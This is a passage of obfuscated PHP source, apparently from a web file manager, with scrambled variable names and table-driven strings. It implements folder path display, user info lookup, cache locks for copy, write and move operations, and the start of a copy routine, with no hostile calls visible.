(isset($ÔØ·î–æ[$œ°çÚ¿¹[$°Ÿ»–ºŞ[194]]])) { $÷«ÆáÔà = $ÔØ·î–æ[$œ°çÚ¿¹[$°Ÿ»–ºŞ[194]]]; if (!is_array($œ°çÚ¿¹[$°Ÿ»–ºŞ[553]])) { $œ°çÚ¿¹[$°Ÿ»–ºŞ[553]] = array(); } $œ°çÚ¿¹[$°Ÿ»–ºŞ[553]][$°Ÿ»–ºŞ[593]] = $÷«ÆáÔà[$°Ÿ»–ºŞ[588]]; $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[594]] = $÷«ÆáÔà; $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[595]] = $œ°çÚ¿¹[$°Ÿ»–ºŞ[596]]; $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[597]] = $°Ÿ»–ºŞ[91]; if ($÷«ÆáÔà[$°Ÿ»–ºŞ[539]] != $‹†ö¥—è) { $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[500]] = $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[500]] & $÷«ÆáÔà[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[499]]; } continue; } $“±Ä¬É = $this->parentLevelArray($œ°çÚ¿¹[$°Ÿ»–ºŞ[598]]); $ë²€ñ¹º = array_reverse($“±Ä¬É); foreach ($ë²€ñ¹º as $õªË·¶° => $Ü¥°óõÆ) { if (!isset($ÔØ·î–æ[$Ü¥°óõÆ])) { continue; } $÷«ÆáÔà = $ÔØ·î–æ[$Ü¥°óõÆ]; $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[594]] = $÷«ÆáÔà; if ($÷«ÆáÔà[$°Ÿ»–ºŞ[539]] != $‹†ö¥—è) { $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[500]] = $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[500]] & $÷«ÆáÔà[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[499]]; } $§Ôß˜ê± = $°Ÿ»–ºŞ[12]; $Êü‡ÜŞ = count($“±Ä¬É) - $õªË·¶°; for ($ıïõğ˜ = 0; $ıïõğ˜ < $Êü‡ÜŞ; $ıïõğ˜++) { if (!isset($èÖóÓËÉ[$“±Ä¬É[$ıïõğ˜]])) { $§Ôß˜ê± = $°Ÿ»–ºŞ[12]; break; } $§Ôß˜ê± = $§Ôß˜ê± . rtrim($èÖóÓËÉ[$“±Ä¬É[$ıïõğ˜]], $°Ÿ»–ºŞ[8]) . $°Ÿ»–ºŞ[8]; } $œ°çÚ¿¹[$°Ÿ»–ºŞ[499]][$°Ÿ»–ºŞ[595]] = rtrim($§Ôß˜ê±, $°Ÿ»–ºŞ[8]) . $°Ÿ»–ºŞ[8]; break; } } unset($œ°çÚ¿¹); } public function groupPathDisplay(&$åÉ¹ïõ) { $Àø­˜Ù¬ =& $_SERVER[´‹ô¯Œ]; if ($åÉ¹ïõ[$Àø­˜Ù¬[191]] != self::TYPE_GROUP) { return; } $ıœº÷ĞÌ = Model($Àø­˜Ù¬[599])->getInfo($åÉ¹ïõ[$Àø­˜Ù¬[583]]); $Ğ©ÃË»½ = $this->parentLevelArray($ıœº÷ĞÌ[$Àø­˜Ù¬[598]]); $†ŸŸ³¬ƒ = $Àø­˜Ù¬[12]; foreach ($Ğ©ÃË»½ as $ŠÕëıØ‚) { $æÇ¨Çêæ = Model($Àø­˜Ù¬[599])->getInfo($ŠÕëıØ‚); $†ŸŸ³¬ƒ .= $æÇ¨Çêæ[$Àø­˜Ù¬[90]][$Àø­˜Ù¬[194]] . $Àø­˜Ù¬[50]; } $åÉ¹ïõ[$Àø­˜Ù¬[600]] = $ıœº÷ĞÌ[$Àø­˜Ù¬[193]]; $åÉ¹ïõ[$Àø­˜Ù¬[601]] = $ıœº÷ĞÌ[$Àø­˜Ù¬[598]]; $åÉ¹ïõ[$Àø­˜Ù¬[602]] = $ıœº÷ĞÌ[$Àø­˜Ù¬[603]]; $åÉ¹ïõ[$Àø­˜Ù¬[604]] = $†ŸŸ³¬ƒ . $ıœº÷ĞÌ[$Àø­˜Ù¬[90]][$Àø­˜Ù¬[194]]; } protected function _listAppendPath(&$Í¶ãéÜò, $ÑİØ¿É÷ = false) { $üĞÚ‘êç =& $_SERVER[´‹ô¯Œ]; static $öè•îÍ = array(); $áÜ°ëëü = array(); $ï—ÊŒˆ† = array(); if ($ÑİØ¿É÷) { return $öè•îÍ; } foreach ($Í¶ãéÜò as &$½¸Í¢ï¥) { $ší¡¬ô¿ = $½¸Í¢ï¥[$üĞÚ‘êç[194]]; if ($½¸Í¢ï¥[$üĞÚ‘êç[497]] == $üĞÚ‘êç[91] && $½¸Í¢ï¥[$üĞÚ‘êç[193]] != 0) { $öè•îÍ[$ší¡¬ô¿] = $½¸Í¢ï¥[$üĞÚ‘êç[32]]; } if ($½¸Í¢ï¥[$üĞÚ‘êç[497]] == $üĞÚ‘êç[91] && $½¸Í¢ï¥[$üĞÚ‘êç[193]] == 0) { $öè•îÍ[$ší¡¬ô¿] = $this->_listAppendPathRoot($½¸Í¢ï¥, array()); } if (isset($ï—ÊŒˆ†[$½¸Í¢ï¥[$üĞÚ‘êç[598]]])) { continue; } $ï—ÊŒˆ†[$½¸Í¢ï¥[$üĞÚ‘êç[598]]] = !0; $òËî–Ó = $this->parentLevelArray($½¸Í¢ï¥[$üĞÚ‘êç[598]]); foreach ($òËî–Ó as $Ïí‘åÄ¦ => $öÕİî€) { if (isset($öè•îÍ[$öÕİî€])) { continue; } if ($Ïí‘åÄ¦ == 0) { $öè•îÍ[$öÕİî€] = $this->_listAppendPathRoot($½¸Í¢ï¥, $òËî–Ó); } if ($Ïí‘åÄ¦ != 0) { $áÜ°ëëü[] = $öÕİî€; } } } unset($½¸Í¢ï¥); $áÜ°ëëü = array_unique($áÜ°ëëü); if (count($áÜ°ëëü) > 0) { $”¹¥–»† = array($üĞÚ‘êç[503] => array($üĞÚ‘êç[504], $áÜ°ëëü)); if (count($áÜ°ëëü) == 1) { $ğœ›ãñ = $this->sourceInfo($áÜ°ëëü[0]); $Ş‚ßÄ÷É = is_array($ğœ›ãñ) ? array($ğœ›ãñ) : !1; } else { $Ş‚ßÄ÷É = $this->field($üĞÚ‘êç[605])->where($”¹¥–»†)->select(); } if (!$Ş‚ßÄ÷É) { $Ş‚ßÄ÷É = array(); } foreach ($Ş‚ßÄ÷É as $Á’·´ã¡) { $öè•îÍ[$Á’·´ã¡[$üĞÚ‘êç[194]]] = $Á’·´ã¡[$üĞÚ‘êç[32]]; } } $şÛè¡Ã½ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $æé¨’Ù = array(); foreach ($Í¶ãéÜò as &$½¸Í¢ï¥) { $İìÉˆÈè = $½¸Í¢ï¥[$üĞÚ‘êç[598]]; $ØöŞ×Ãä = $üĞÚ‘êç[12]; if (isset($æé¨’Ù[$İìÉˆÈè])) { $ØöŞ×Ãä = $æé¨’Ù[$İìÉˆÈè]; } else { $òËî–Ó = $this->parentLevelArray($½¸Í¢ï¥[$üĞÚ‘êç[598]]); foreach ($òËî–Ó as $Ïí‘åÄ¦ => $öÕİî€) { if (isset($öè•îÍ[$öÕİî€])) { $ØöŞ×Ãä .= $öè•îÍ[$öÕİî€] . $üĞÚ‘êç[8]; } } $æé¨’Ù[$İìÉˆÈè] = $ØöŞ×Ãä; } $ØöŞ×Ãä .= $½¸Í¢ï¥[$üĞÚ‘êç[32]]; if ($½¸Í¢ï¥[$üĞÚ‘êç[497]] == $üĞÚ‘êç[91]) { $ØöŞ×Ãä .= $üĞÚ‘êç[8]; } $½¸Í¢ï¥[$üĞÚ‘êç[596]] = str_replace($üĞÚ‘êç[257], $üĞÚ‘êç[8], $ØöŞ×Ãä); if ($½¸Í¢ï¥[$üĞÚ‘êç[193]] == $üĞÚ‘êç[231]) { $½¸Í¢ï¥[$üĞÚ‘êç[32]] = trim($öè•îÍ[$½¸Í¢ï¥[$üĞÚ‘êç[194]]], $üĞÚ‘êç[8]); $½¸Í¢ï¥[$üĞÚ‘êç[596]] = $½¸Í¢ï¥[$üĞÚ‘êç[32]] . $üĞÚ‘êç[8]; } if (intval($½¸Í¢ï¥[$üĞÚ‘êç[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($½¸Í¢ï¥, $òËî–Ó, $şÛè¡Ã½); } } unset($½¸Í¢ï¥); return $Í¶ãéÜò; } private function _listAppendPathRecycle(&$ºæËÕ›, $·æï‹ë„, $Å¨õ°ñ) { $Àö¼š¡è =& $_SERVER[´‹ô¯Œ]; if (!in_array($Å¨õ°ñ, $·æï‹ë„) && $ºæËÕ›[$Àö¼š¡è[194]] != $Å¨õ°ñ) { return; } $ö¾…’­× = explode($Àö¼š¡è[8], trim($ºæËÕ›[$Àö¼š¡è[596]], $Àö¼š¡è[8])); $êĞòÂè = implode($Àö¼š¡è[8], array_slice($ö¾…’­×, 2)); $ºæËÕ›[$Àö¼š¡è[596]] = $Àö¼š¡è[8] . LNG($Àö¼š¡è[606]) . $Àö¼š¡è[8] . ltrim($êĞòÂè, $Àö¼š¡è[8]); $ºæËÕ›[$Àö¼š¡è[598]] = $Àö¼š¡è[607] . implode($Àö¼š¡è[50], array_slice($·æï‹ë„, 1)) . $Àö¼š¡è[50]; if ($ºæËÕ›[$Àö¼š¡è[194]] == $Å¨õ°ñ) { $ºæËÕ›[$Àö¼š¡è[598]] = $Àö¼š¡è[607]; $ºæËÕ›[$Àö¼š¡è[193]] = $Àö¼š¡è[231]; $ºæËÕ›[$Àö¼š¡è[32]] = LNG($Àö¼š¡è[606]); } $ºæËÕ›[$Àö¼š¡è[608]] = $Àö¼š¡è[609]; } protected function _listAppendPathRoot(&$áÔÖŒ©, $±ôŠÌ‘Ó) { $„ñØåùò =& $_SERVER[´‹ô¯Œ]; static $šü¤Å² = false; static $±½¤Úô× = false; $†ÎòŞÜñ = $„ñØåùò[12]; if ($áÔÖŒ©[$„ñØåùò[191]] == self::TYPE_USER) { if ($áÔÖŒ©[$„ñØåùò[583]] == USER_ID) { $†ÎòŞÜñ = LNG($„ñØåùò[610]); if ($šü¤Å² === !1) { $ºÃñ¹úÉ = Model($„ñØåùò[611])->getInfoFull(USER_ID); $šü¤Å² = _get($ºÃñ¹úÉ, $„ñØåùò[612], $„ñØåùò[12]); } if ($±½¤Úô× === !1) { $ºÃñ¹úÉ = Model($„ñØåùò[611])->getInfoFull(USER_ID); $±½¤Úô× = _get($ºÃñ¹úÉ, $„ñØåùò[613], $„ñØåùò[12]); } if ($±ôŠÌ‘Ó && $±ôŠÌ‘Ó[0] == $šü¤Å² || !$±ôŠÌ‘Ó && $áÔÖŒ©[$„ñØåùò[194]] == $šü¤Å²) { $†ÎòŞÜñ = LNG($„ñØåùò[614]); $áÔÖŒ©[$„ñØåùò[615]] = $„ñØåùò[616]; } if ($±ôŠÌ‘Ó && $±ôŠÌ‘Ó[0] == $±½¤Úô× || !$±ôŠÌ‘Ó && $áÔÖŒ©[$„ñØåùò[194]] == $±½¤Úô×) { $†ÎòŞÜñ = $†ÎòŞÜñ . $„ñØåùò[617] . LNG($„ñØåùò[618]); } if (!$±ôŠÌ‘Ó) { $áÔÖŒ©[$„ñØåùò[32]] = $†ÎòŞÜñ; } } else { $ºÃñ¹úÉ = Model($„ñØåùò[611])->getInfoFull($áÔÖŒ©[$„ñØåùò[583]]); $ÂÒ³ÖŒË = _get($ºÃñ¹úÉ, $„ñØåùò[613], $„ñØåùò[12]); $áÔÖŒ©[$„ñØåùò[619]] = Model($„ñØåùò[591])->getInfoSimpleOuter($áÔÖŒ©[$„ñØåùò[583]]); $†ÎòŞÜñ = LNG($„ñØåùò[620]) . $„ñØåùò[176] . $áÔÖŒ©[$„ñØåùò[619]][$„ñØåùò[32]] . $„ñØåùò[178]; if ($±ôŠÌ‘Ó && $±ôŠÌ‘Ó[0] == $ÂÒ³ÖŒË || !$±ôŠÌ‘Ó && $áÔÖŒ©[$„ñØåùò[194]] == $ÂÒ³ÖŒË) { $†ÎòŞÜñ = LNG($„ñØåùò[620]) . $„ñØåùò[621] . $áÔÖŒ©[$„ñØåùò[619]][$„ñØåùò[32]] . $„ñØåùò[617] . LNG($„ñØåùò[618]) . $„ñØåùò[178]; } } } else { if ($áÔÖŒ©[$„ñØåùò[191]] == self::TYPE_GROUP) { $”ğß—Ê = Model($„ñØåùò[599])->getInfoSimple($áÔÖŒ©[$„ñØåùò[583]]); $†ÎòŞÜñ = $”ğß—Ê[$„ñØåùò[32]]; } else { if ($áÔÖŒ©[$„ñØåùò[191]] == self::TYPE_SYSTEM) { $†ÎòŞÜñ = $„ñØåùò[622]; } } } $†ÎòŞÜñ = $†ÎòŞÜñ ? $„ñØåùò[8] . $†ÎòŞÜñ . $„ñØåùò[8] : $„ñØåùò[8]; return $†ÎòŞÜñ; } protected function _listAppendUser(&$ŸÎ™Š­é) { $â­ä¨Ç =& $_SERVER[´‹ô¯Œ]; $èŞîˆ·û = array_to_keyvalue($ŸÎ™Š­é, $â­ä¨Ç[12], $â­ä¨Ç[539]); $ğ‘á²Ã = array_to_keyvalue($ŸÎ™Š­é, $â­ä¨Ç[12], $â­ä¨Ç[541]); $ñó»åæ¾ = array_merge($èŞîˆ·û, $ğ‘á²Ã); $óìï‰ÈÕ = Model($â­ä¨Ç[611])->userListInfo($ñó»åæ¾); foreach ($ŸÎ™Š­é as &$ƒ¦ñŞİ„) { $öÇËî¾Ö = $ƒ¦ñŞİ„[$â­ä¨Ç[539]]; $ƒ¦ñŞİ„[$â­ä¨Ç[539]] = $óìï‰ÈÕ[$öÇËî¾Ö] ? $óìï‰ÈÕ[$öÇËî¾Ö] : !1; $öÇËî¾Ö = $ƒ¦ñŞİ„[$â­ä¨Ç[541]]; $ƒ¦ñŞİ„[$â­ä¨Ç[541]] = $óìï‰ÈÕ[$öÇËî¾Ö] ? $óìï‰ÈÕ[$öÇËî¾Ö] : !1; if (_get($ƒ¦ñŞİ„, $â­ä¨Ç[623], 0)) { $«„ êÀØ = $GLOBALS[$â­ä¨Ç[6]][$â­ä¨Ç[92]][$â­ä¨Ç[624]]; if ($ƒ¦ñŞİ„[$â­ä¨Ç[553]][$â­ä¨Ç[625]] <= time() - $«„ êÀØ) { $this->metaSet($ƒ¦ñŞİ„[$â­ä¨Ç[194]], $â­ä¨Ç[626], null); $this->metaSet($ƒ¦ñŞİ„[$â­ä¨Ç[194]], $â­ä¨Ç[625], null); unset($ƒ¦ñŞİ„[$â­ä¨Ç[553]][$â­ä¨Ç[626]]); continue; } $Ş•ğØ¥š = $ƒ¦ñŞİ„[$â­ä¨Ç[553]][$â­ä¨Ç[626]]; $ƒ¦ñŞİ„[$â­ä¨Ç[553]][$â­ä¨Ç[627]] = Model($â­ä¨Ç[611])->getInfoSimpleOuter($Ş•ğØ¥š); } } unset($ƒ¦ñŞİ„); } public function parentLevelArray($£Òßı) { $”ŒÈÜÂ— =& $_SERVER[´‹ô¯Œ]; $£Òßı = explode($”ŒÈÜÂ—[50], trim($£Òßı, $”ŒÈÜÂ—[50])); return array_remove_value($£Òßı, $”ŒÈÜÂ—[231]); } public function listAll($Ó‡²§ğ) { $»¡µ¯•€ =& $_SERVER[´‹ô¯Œ]; $‡²òû•è = $this->sourceInfo($Ó‡²§ğ); $Ã•ÖÀœÓ = array($»¡µ¯•€[628] => array($»¡µ¯•€[629], $‡²òû•è[$»¡µ¯•€[598]] . $Ó‡²§ğ . $»¡µ¯•€[630]), $»¡µ¯•€[631] => 0); $—ÆµÈ÷ = $»¡µ¯•€[632]; $˜¤şĞñ¬ = "\x4c\x45\x46\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\x6f\137\x66\x69\154\145\x20\x66\151\x6c\145\40\157\x6e\40\163\157\165\162\x63\x65\x2e\146\151\154\x65\111\104\x20\75\40\x66\x69\154\x65\x2e\146\151\x6c\x65\x49\104"; $Ã¿÷ßò = $this->alias($»¡µ¯•€[531])->field($—ÆµÈ÷)->where($Ã•ÖÀœÓ)->join($˜¤şĞñ¬)->select(); $this->_listAppendAuth($Ã¿÷ßò); $this->_listAppendUser($Ã¿÷ßò); $this->_listAppendPath($Ã¿÷ßò); $Ã¿÷ßò = array_to_keyvalue($Ã¿÷ßò, $»¡µ¯•€[194]); $¡øŠíÂŸ = "\x2f{$‡²òû•è[$»¡µ¯•€[32]]}\x2f"; $¡øŠíÂŸ = $¡øŠíÂŸ == $»¡µ¯•€[257] ? $»¡µ¯•€[8] : $¡øŠíÂŸ; $µ–÷»×ô = array(); foreach ($Ã¿÷ßò as $ƒ´´î => $ÒÜ‚‘¬) { $¡Ø‘ı¹Ø = $this->parentLevelArray($ÒÜ‚‘¬[$»¡µ¯•€[598]]); array_shift($¡Ø‘ı¹Ø); $ÍˆÛË…ä = $¡øŠíÂŸ; for ($“¾ò™œÇ = 0; $“¾ò™œÇ < count($¡Ø‘ı¹Ø); $“¾ò™œÇ++) { $ÍˆÛË…ä .= $Ã¿÷ßò[$¡Ø‘ı¹Ø[$“¾ò™œÇ]][$»¡µ¯•€[32]] . $»¡µ¯•€[8]; } $ÍˆÛË…ä .= $ÒÜ‚‘¬[$»¡µ¯•€[32]]; if ($ÒÜ‚‘¬[$»¡µ¯•€[497]]) { $ÍˆÛË…ä .= $»¡µ¯•€[8]; } $âš¶¿Õ› = array($»¡µ¯•€[507] => str_replace($»¡µ¯•€[257], $»¡µ¯•€[8], str_replace($»¡µ¯•€[257], $»¡µ¯•€[8], str_replace($»¡µ¯•€[257], $»¡µ¯•€[8], $ÍˆÛË…ä))), $»¡µ¯•€[633] => intval($ÒÜ‚‘¬[$»¡µ¯•€[497]]), $»¡µ¯•€[634] => intval($ÒÜ‚‘¬[$»¡µ¯•€[79]]), $»¡µ¯•€[88] => intval($ÒÜ‚‘¬[$»¡µ¯•€[88]]), $»¡µ¯•€[90] => $this->pathInfoFilter($ÒÜ‚‘¬)); if (!$âš¶¿Õ›[$»¡µ¯•€[497]]) { $âš¶¿Õ›[$»¡µ¯•€[555]] = $ÒÜ‚‘¬[$»¡µ¯•€[555]]; } $µ–÷»×ô[] = $âš¶¿Õ›; } $µ–÷»×ô = array_sort_by($µ–÷»×ô, $»¡µ¯•€[87]); return $µ–÷»×ô; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ïÆÅÃ†µ) { $ˆò‘¶™ó =& $_SERVER[´‹ô¯Œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ˆò‘¶™ó[635], $ïÆÅÃ†µ); $œ‚¨ñ£ı = 1; $this->_lockEvent($ïÆÅÃ†µ, array($ˆò‘¶™ó[636], $ˆò‘¶™ó[637]), $œ‚¨ñ£ı); $this->_lockParent($ïÆÅÃ†µ, array($ˆò‘¶™ó[637]), $œ‚¨ñ£ı); $this->_lockEvent($ïÆÅÃ†µ, array($ˆò‘¶™ó[638], $ˆò‘¶™ó[639]), $œ‚¨ñ£ı); $this->_lockCheckEnd($ˆò‘¶™ó[635], $ïÆÅÃ†µ); } public function lockCopyEnd($ „ï¾Ë®) { $ş´äªáŞ =& $_SERVER[´‹ô¯Œ]; if (!$this->allowLock()) { return; } $›÷ûÒ¥‘ = 0; $this->_lockEvent($ „ï¾Ë®, array($ş´äªáŞ[636], $ş´äªáŞ[637]), $›÷ûÒ¥‘); $this->_lockParent($ „ï¾Ë®, array($ş´äªáŞ[637]), $›÷ûÒ¥‘); $this->_lockEvent($ „ï¾Ë®, array($ş´äªáŞ[638], $ş´äªáŞ[639]), $›÷ûÒ¥‘); } public function lockWriteStart($Ÿ²çê§Ø, $Ìîë§… = '') { $ÀĞ÷…¤ =& $_SERVER[´‹ô¯Œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÀĞ÷…¤[636], $Ÿ²çê§Ø); $×¤•¶ÜÌ = 1; $this->_lockKey($ÀĞ÷…¤[640] . $Ÿ²çê§Ø . $ÀĞ÷…¤[10] . $Ìîë§…, $×¤•¶ÜÌ); $this->_lockEvent($Ÿ²çê§Ø, array($ÀĞ÷…¤[635], $ÀĞ÷…¤[637]), $×¤•¶ÜÌ); $this->_lockParent($Ÿ²çê§Ø, array($ÀĞ÷…¤[635], $ÀĞ÷…¤[637]), $×¤•¶ÜÌ); $this->_lockCheckEnd($ÀĞ÷…¤[636], $Ÿ²çê§Ø); } public function lockWriteEnd($¤ƒ¨çÓ¢, $ºŸôèù = '') { $Ä‘’Íí› =& $_SERVER[´‹ô¯Œ]; if (!$this->allowLock()) { return; } $ğ£— „Ô = 0; $this->_lockKey($Ä‘’Íí›[640] . $¤ƒ¨çÓ¢ . $Ä‘’Íí›[10] . $ºŸôèù, $ğ£— „Ô); $this->_lockEvent($¤ƒ¨çÓ¢, array($Ä‘’Íí›[635], $Ä‘’Íí›[637]), $ğ£— „Ô); $this->_lockParent($¤ƒ¨çÓ¢, array($Ä‘’Íí›[635], $Ä‘’Íí›[637]), $ğ£— „Ô); } public function lockMoveStart($“·­¶ã¬) { $ÛÍ‰ƒ½Š =& $_SERVER[´‹ô¯Œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÛÍ‰ƒ½Š[637], $“·­¶ã¬); $Õ£ÀûÌÊ = 1; $this->_lockKey($ÛÍ‰ƒ½Š[641] . $“·­¶ã¬, $Õ£ÀûÌÊ); $this->_lockEvent($“·­¶ã¬, array($ÛÍ‰ƒ½Š[635], $ÛÍ‰ƒ½Š[636]), $Õ£ÀûÌÊ); $this->_lockParent($“·­¶ã¬, array($ÛÍ‰ƒ½Š[635], $ÛÍ‰ƒ½Š[637]), $Õ£ÀûÌÊ); $this->_lockEvent($“·­¶ã¬, array($ÛÍ‰ƒ½Š[642], $ÛÍ‰ƒ½Š[638], $ÛÍ‰ƒ½Š[639]), $Õ£ÀûÌÊ); $this->_lockCheckEnd($ÛÍ‰ƒ½Š[637], $“·­¶ã¬); } public function lockMoveEnd($•ª¸øÊŞ) { $³íÛş€³ =& $_SERVER[´‹ô¯Œ]; if (!$this->allowLock()) { return; } $µƒä¿Ş¢ = 0; $this->_lockKey($³íÛş€³[641] . $•ª¸øÊŞ, $µƒä¿Ş¢); $this->_lockEvent($•ª¸øÊŞ, array($³íÛş€³[635], $³íÛş€³[636]), $µƒä¿Ş¢); $this->_lockParent($•ª¸øÊŞ, array($³íÛş€³[635], $³íÛş€³[637]), $µƒä¿Ş¢); $this->_lockEvent($•ª¸øÊŞ, array($³íÛş€³[642], $³íÛş€³[638], $³íÛş€³[639]), $µƒä¿Ş¢); } private function _lockCheck($¨–‚×‚, $¿ŞîÕÍ¬) { $ÃïÄÜ…ó =& $_SERVER[´‹ô¯Œ]; $ÂÖîäƒ‰ = $this->sourceInfo($¿ŞîÕÍ¬); $éä“ÍÇ = $¨–‚×‚ . $ÃïÄÜ…ó[10] . $¿ŞîÕÍ¬; $this->_lockTimeStart[$éä“ÍÇ] = timeFloat(); if (!is_array($ÂÖîäƒ‰)) { return; } $Ä¬ƒÉç = LNG($ÃïÄÜ…ó[643]); CacheLock::setErrorMsg($ÃïÄÜ…ó[176] . htmlspecialchars($ÂÖîäƒ‰[$ÃïÄÜ…ó[32]]) . $ÃïÄÜ…ó[178] . $Ä¬ƒÉç); $this->_lockKey($éä“ÍÇ, 1); $this->_lockKey($éä“ÍÇ, 0); $©½ï±Íá = array_reverse($this->parentLevelArray($ÂÖîäƒ‰[$ÃïÄÜ…ó[598]])); foreach ($©½ï±Íá as $ÑÅÌäÚ) { $éä“ÍÇ = $¨–‚×‚ . $ÃïÄÜ…ó[644] . $ÑÅÌäÚ; if (CacheLock::lockGet($ÃïÄÜ…ó[645] . $éä“ÍÇ)) { $ÂÖîäƒ‰ = $this->sourceInfo($ÑÅÌäÚ); CacheLock::setErrorMsg($ÃïÄÜ…ó[176] . htmlspecialchars($ÂÖîäƒ‰[$ÃïÄÜ…ó[32]]) . $ÃïÄÜ…ó[178] . $Ä¬ƒÉç); $this->_lockKey($éä“ÍÇ, 1); $this->_lockKey($éä“ÍÇ, 0); } } } private function _lockCheckEnd($¥—»²¶, $‚ãÁÌÑ) { $‹°Ö‚Î =& $_SERVER[´‹ô¯Œ]; $ÚÚ¸ùô“ = $¥—»²¶ . $‹°Ö‚Î[10] . $‚ãÁÌÑ; CacheLock::setErrorMsg($‹°Ö‚Î[457]); if (!isset($this->_lockTimeStart[$ÚÚ¸ùô“])) { return; } $ËÄ·İŸá = timeFloat() - $this->_lockTimeStart[$ÚÚ¸ùô“]; unset($this->_lockTimeStart[$ÚÚ¸ùô“]); if ($ËÄ·İŸá > 0.5) { unset(self::$cacheSourceInfo[$‹°Ö‚Î[545] . $‚ãÁÌÑ]); } $€Ğ›Íê = $this->sourceInfo($‚ãÁÌÑ); if (!$€Ğ›Íê) { show_json(LNG($‹°Ö‚Î[108]), !1); } } private function _lockParent($¨Û¿çß, $ùıºê, $…œœ–™ü) { if (!$this->autoLockSet) { return; } $Ä¢Ú¼Èß = $this->sourceInfo($¨Û¿çß); if (!is_array($Ä¢Ú¼Èß)) { return; } $Òâ‡Ğáµ = array_reverse($this->parentLevelArray($Ä¢Ú¼Èß[$_SERVER[´‹ô¯Œ][598]])); foreach ($Òâ‡Ğáµ as $ÇäÔ¥) { $this->_lockEvent($ÇäÔ¥, $ùıºê, $…œœ–™ü); } } private function _lockEvent($´ğ’ïş, $À’‹œİÄ, $ÉŒ„ò÷é) { $ôİ¾Ûòû =& $_SERVER[´‹ô¯Œ]; if (!$this->autoLockSet) { return; } foreach ($À’‹œİÄ as $‚õÌòÌ) { $è’Âõ±­ = $‚õÌòÌ . $ôİ¾Ûòû[10] . $´ğ’ïş; if ($ÉŒ„ò÷é && CacheLock::lockGet($ôİ¾Ûòû[645] . $è’Âõ±­)) { continue; } $this->_lockKey($è’Âõ±­, $ÉŒ„ò÷é); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Æ“ò’ÂĞ, $äî°¨õ¾ = 1) { $¿¬Î½á’ = $_SERVER[´‹ô¯Œ][645] . md5($Æ“ò’ÂĞ); if ($äî°¨õ¾) { if (isset(self::$_lockItemArr[$¿¬Î½á’])) { return; } self::$_lockItemArr[$¿¬Î½á’] = 1; CacheLock::lock($¿¬Î½á’, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¿¬Î½á’])) { return; } unset(self::$_lockItemArr[$¿¬Î½á’]); CacheLock::unlock($¿¬Î½á’); } } public function isParentOf($¸ëøŞÀ, $¤î¦Ìã) { $¡â°º¨Å =& $_SERVER[´‹ô¯Œ]; $Ò™éÕ¼ = $this->sourceInfo($¸ëøŞÀ); $âëúÆç³ = $this->sourceInfo($¤î¦Ìã); $¸¡ìÆİ± = $Ò™éÕ¼[$¡â°º¨Å[598]] . $Ò™éÕ¼[$¡â°º¨Å[194]] . $¡â°º¨Å[50]; $¼»ì¥ÜÆ = $âëúÆç³[$¡â°º¨Å[598]] . $âëúÆç³[$¡â°º¨Å[194]] . $¡â°º¨Å[50]; $£Ùç…û = strpos($¼»ì¥ÜÆ, $¸¡ìÆİ±) === 0; return $£Ùç…û; } private $targetIsDelete = 0; public function copy($õ¨¡ª†´, $åÂÁ¼¢ß, $„¤É¶÷Ê = REPEAT_REPLACE, $çÌ¡Ñ‹Ì = '') { $ı«›ÄĞ£ =& $_SERVER[´‹ô¯Œ]; $šØÓì„ = $this->sourceInfo($õ¨¡ª†´); $†ıô¹¬™ = $this->sourceInfo($åÂÁ¼¢ß); if (!$šØÓì„ || !$†ıô¹¬™ || $†ıô¹¬™[$ı«›ÄĞ£[497]] != $ı«›ÄĞ£[91]) { return !1; } if ($this->isParentOf($õ¨¡ª†´, $åÂÁ¼¢ß)) { return !1; } $ıİ ƒàú = $çÌ¡Ñ‹Ì ? $çÌ¡Ñ‹Ì : $šØÓì„[$ı«›ÄĞ£[32]]; $this->lockCopyStart($õ¨¡ª†´); $this->lockWriteStart($åÂÁ¼¢ß, $ıİ ƒàú); $…Á™ğâÈ = array($ı«›ÄĞ£[646] => array(), $ı«›ÄĞ£[647] => array(), $ı«›ÄĞ£[648] => array()); $this->targetIsDelete = intval($šØÓì„[$ı«›ÄĞ£[517]]); $‡şñŞË± = $this->fileNameExistAuto($åÂÁ¼¢ß, $šØÓì„); $½ÔûÊÊ¢ = $this->_copy($õ¨¡ª†´, $åÂÁ¼¢ß, $„¤É¶÷Ê, $…Á™ğâÈ, !0, $çÌ¡Ñ‹Ì); $this->_childrenListClear(); $this->lockCopyEnd($õ¨¡ª†´); $this->lockWriteEnd($åÂÁ¼¢ß, $ıİ ƒàú); if ($šØÓì„[$ı«›ÄĞ£[497]] == $ı«›ÄĞ£[91] && $‡şñŞË± == $½ÔûÊÊ¢) { $this->folderSizeResetChildren($‡şñŞË±); } Model($ı«›ÄĞ£[649])->addAll($…Á™ğâÈ[$ı«›ÄĞ£[647]], array(), !0); if ($‡şñŞË± != $½ÔûÊÊ¢ || $šØÓì„[$ı«›ÄĞ£[497]] == $ı«›ÄĞ£[91]) { Model($ı«›ÄĞ£[650])->eventCopy($½ÔûÊÊ¢); } $this->saveAll($…Á™ğâÈ[$ı«›ÄĞ£[648]]); Model($ı«›ÄĞ£[233])->linkAdd($…Á™ğâÈ[$ı«›ÄĞ£[646]]); $this->folderSizeReset($åÂÁ¼¢ß); $this->updateModifyTime($åÂÁ¼¢ß); return 